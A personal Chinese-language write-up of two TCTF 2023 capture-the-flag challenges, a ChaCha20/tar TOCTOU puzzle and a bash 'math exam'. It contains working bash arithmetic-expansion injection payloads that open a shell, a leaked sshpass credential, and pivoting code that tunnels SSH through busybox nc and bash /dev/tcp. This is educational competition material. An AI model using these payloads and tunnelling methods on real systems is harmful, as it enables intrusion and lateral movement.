# 0ctf/tencent ctf (TCTF) 2023 个人参赛Writeup (misc x 1.5)

Lysithea

又是一次大型比赛，又是单刷团队副本，又是发着烧答题（怎么这么似曾相识呢）。

这次难度感觉很高，我总共只花了半天（不到6个小时），misc的ctar做出来了，math exam做出了前两个flag，在比赛结束后两天把后两个flag也补了。感觉有些知识点值得记录


## ctar (misc, chacha20, tar format)

### 代码分析
题目代码有160多行（很长，但是在这个比赛里算短的了）。每次连接后，首先要过一个proof of work, 即爆破一个四位的sha256 hash。

通过PoW后，是一个基于ChaCha20算法和tar file的文件系统。实际的物理存储在一个临时目录里，并且有一个`self.data`字典来记录上传的文件名、类型。结合这些，我们来看看暴露的几个接口：

1. add secret，可以上传一个文件，然后随机生成一个8位hex作为文件名。然后以`self.data[name] = 1`的形式存储。
2. upload ctar，是download ctar的逆过程，上传的本身是Chacha20加密的密文，前8个字节是IV（nonce），解密后应该是一个tar文件，然后先把`self.data`对应名字改为1，然后把tar文件解压（`extractall`）到当前目录

```python
for fname in f.getnames():
    self.data[fname] = 1

f.extractall(path=self.dir)
os.unlink(tname)
self.request.sendall(b"[OK] upload succeeded\n")
```

不过加入不是合法的ctar文件，则会把解密后的明文打印出来。

3. read secret，假的，没有功能
4. download ctar，把目前`self.data`包括的所有文件打包成tar文件，然后进行ChaCha20加密（密钥是固定且未知的）。但是只要包含了真正的flag(`self.data`有项目为0)在返回的密文中不包含IV。
5. add flag，类似add secret，但是添加的是flag内容，并且会设置对应`self.data[name]=0`

然后会有一些上限，上传文件总数最大为9（包括ctar解压出来的文件数），上传文件大小最大为100，tar文件最大为100000。没有报错，不过因为基本会有特征输出，如果没有看到可以反推可能发生了报错。

### 解题思路
很明显我们需要add flag之后通过某种方式拿到flag的具体位置，但是ctar在没有key的情况下加解密只能在云端进行。

首先一个知识点：Chacha20作为一种基于模加、循环移位、异或的流密码算法，已知一组明文密文对，可以伪造任意密文（non-authority）：`c1 ^ m1 ^ m2 = c2`。

另一方面，当不添加任何数据时，我们可以download获得完整的IV和cipher，同时我们非常清楚明文是什么，就是空tar，即：

```python
with tarfile.open("a.tar", 'w') as f:
    pass
```

因而我们可以做到在upload流程中上传任何tar文件走解压流程或解密流程。然而，upload流程是需要IV的，绕过的方法是这样一个TOCTOU：
```python
for fname in f.getnames():
    self.data[fname] = 1

# make above succeed and below fail 
f.extractall(path=self.dir)
```
即需要在`f.getnames()`流程中成功，但是`extractall`流程中失败。一个可行的方案是，如果我们在tar里打包一个同名的文件夹，因为Linux文件系统不允许同名的文件和文件夹，所以解压过程会失败，flag文件不会被覆盖，但是`self.data`已经改了，我们就可以正常在`download`过程中获得IV了。最后我们通过异或破坏掉tar结构，走一遍解密流程，通过报错信息就可以获取到原始明文了。（原始明文是包含flag文件的tar）

`flag{s0_....___wHat_hApPeneD_w1Th_My_t4rfI1E?_:/}`

## math exam
以bash为主题的一道题，学习了不少bash的特性，很有意思

### 1. Arithmetic expansion RCE
给了一段代码，是一个bash写的简单算数考试程序。我们只关注和用户输入有关的部分，有两处
```bash
read userinput

if [ "$userinput" = "$promisetext" ]
then
...
ans=$(($i+$i))
read line

if [[ "$line" -eq "$ans" ]]
then
...
```
很显然第二处`[[]]`的arithmetic expansion要更强一点。通过查阅bash manual可以发现很多很有趣的现象，比如可以在里面嵌入`a=1`这样的赋值语句来做赋值。然而为了命令执行我们需要类似`$()`或者` `` `这样的语法。

于是我谷歌到了这篇博客：[https://research.nccgroup.com/2020/05/12/shell-arithmetic-expansion-and-evaluation-abuse/](https://research.nccgroup.com/2020/05/12/shell-arithmetic-expansion-and-evaluation-abuse/)，发现在数组下标里可以无代价使用`$()`，比如`arr[$(ls)]`就可以在报错信息里拿到回显，自然也可以`arr[$(cat flag1)]`拿到flag1。

另外，尝试一下会发现`arr[$(sh)]`能执行命令，但是只能看到报错回显而看不到正常命令回显。很容易想到`arr[$(sh >&2)]`能解决这个问题拿到正常的shell。

### 2. busybox nc to ssh
拿到shell之后进行一些简单的信息收集，很容易发现根目录有个`.connect.sh.swp`即vim临时文件，结尾有个很可疑的ssh连接语句：`sshpass -p x5kdkwjr8exi2bf70y8g80bggd2nuepf ssh ctf@second`。这个`second`向我们提示了flag2的所在地，ssh的用户和密码也有了，那么我们就需要以这台机器作为跳板连接second服务器。

不过很快我们会发现这台机器没有装ssh，不过有个busybox。直接运行busybox可以看到里面包含的命令，包括`nc`。既然如此，我们可以`busybox nc second 22 1>&2`手动连接SSH端口，然后把一个ssh客户端的通信转发到这个nc里，即自己实现一个代理。`pwntools`可以比较好的实现这一点，比如：
```python
print('start listen on 20228')
sock_input = listen(20228)
conn_input = sock_input.wait_for_connection()
print('establish on 20228')

while True:
    res = b''
    while frag := conn.recv(65536, timeout=.01):
        res += frag

    if res:
        # print('receive', res)
        conn_input.send(res)
    # get cmd
    cmd = b''
    while frag := conn_input.recv(65536, timeout=.01):
        cmd += frag

    if cmd:
        # print('send', cmd)
        conn.send(cmd)
```
然后本地用ssh执行`ssh -o ProxyCommand="nc localhost 20228" ctf@second`即可

### 3 and 4: bash <>/dev/tcp to ssh
second服务器是一个bash shell，没有busybox，只有ls, cat了。但这个时候你可能会发现类似printf，read，pwd之类的指令还可以用，这是为什么呢？

因为这些指令并非外置的程序，而是bash的内置命令。可以在bash里help看到命令列表，然后help printf查看printf的用法。值得一提的是，这些通常是没有manual的（比如bash的read就不能用man read查看，但可以help read查看）

另外bash还有个神奇特性是可以通过和`/dev/tcp/<host>/<port>`来进行TCP连接通信，即使`/dev`文件并不存在（这里就没有）。这也是bash的内置扩展特性。

所以思路类似，我们仍然要通过`exec 3<>/dev/tcp/third/22`建立TCP连接后，转发和真实SSH客户端的通信。麻烦在于，没有nc，我们必须要通过纯bash实现这一点。因为bash的神奇特性（万物皆字符串，因此万物会被\0截断），我们必须要实现一个简单的编解码器。最简单的编码是base16，以下是我(在Claude帮助下)写的：

```bash
b16enc () { 
    byte=; 
    IFS= read -r -d "" -u 3 -t .01 -n 1 byte; 
    until [[ $? -gt 128 ]]; 
    do 
        if [[ -z $byte ]] ; 
            then echo -n 00; 
        else 
            hex=$(printf "%02X" "\'$byte"); 
            echo -n "$hex" ; 
        fi; 
        byte=; 
        IFS= read -r -d "" -u 3 -t .01 -n 1 byte; 
    done 
}
b16dec () { 
    for ((i=0; i<$((${#1} / 2)); i++)); 
    do 
        hex=${1:$((2*$i)):2}; 
        printf "\\x$hex"; 
    done 
}
```
主要难点在于`b16enc`中，如果读取到了null byte，返回变量是空字符串，要做特殊处理。而如果没有读到内容timeout了，read的返回值会返回一个大于128的值（`help read`）

如果null byte问题解决不了，开启`ssh -vvv`时很可能会看到报错：`Bad Packet Length: 70518548`。这个问题如果你直接搜，很难搜到答案，并且很多回答方向都是错的（[这个](https://security.stackexchange.com/questions/124767/what-could-cause-bad-packet-length-with-sshd)的一楼说的有那么点靠近）。实际就是因为，SSH协议第二段协商（第一段是返回SSH版本），前4个字节表示SSH数据帧的大小（这个是应用层的帧，即SSH协议的数据帧，而不是传输层链路层等的，所以和所谓runts，MTU都完全没有关系）在这个例子里，实际的包文应该是：
```
00 00 04 34 07 14 ...
```
因而实际packet size是`0x0434=1076`，但是如果null byte全部没有被接收到（比如很不幸的你用了read -N参数，会忽略所有空白字符），那么接收到的就是
```
04 34 07 14 ...
```
那么SSH客户端就会认为包文长度是`0x4340714=70518548`，显然一个包是不可能有这么多字节的，SSH客户端就会报错拒绝连接。

于是就可以连接成功了。实际上third, fourth服务器也是同样的bash SSH连接。third服务器去掉了cat，fourth服务器连ls也去掉了，不过这都没关系因为我们知道flag文件名命名格式，并且可以用纯粹的bash内置命令读取输出文件：

```bash
exec 4<flag4
IFS= read -r -d "" -u 4 -n 1024 -t .02 f; echo $f
```
另外也可以观察到随着跳板级数增加，输入延迟也几何级数上升，fourth里登录要等好几分钟，要在fourth里执行个命令几乎要等好几十秒
